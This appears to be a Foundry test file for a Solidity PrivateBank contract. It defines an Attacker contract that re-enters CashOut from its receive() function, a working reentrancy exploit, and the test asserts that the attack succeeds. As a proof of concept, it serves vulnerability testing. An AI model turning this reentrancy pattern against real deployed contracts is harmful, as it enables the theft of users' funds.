
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {

    PrivateBank public privateBank;
    
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        privateBank = new PrivateBank(address(transferLog));
        
        _attacker = new Attacker(address(privateBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 2);
        

        vm.deal(address(privateBank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public privateBank;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackVal;
    uint256 public reentryBalance;

    constructor(address victimAddress) { 
        privateBank = PrivateBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackVal = val;
        
        privateBank.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = privateBank.balances(address(this));

        privateBank.CashOut(attackVal);

        exploitSucceeded = (attackCallCount == 2 && reentryBalance == initialSnapshot);
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            reentryBalance = privateBank.balances(address(this));
            privateBank.CashOut(attackVal);
        }
    }
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
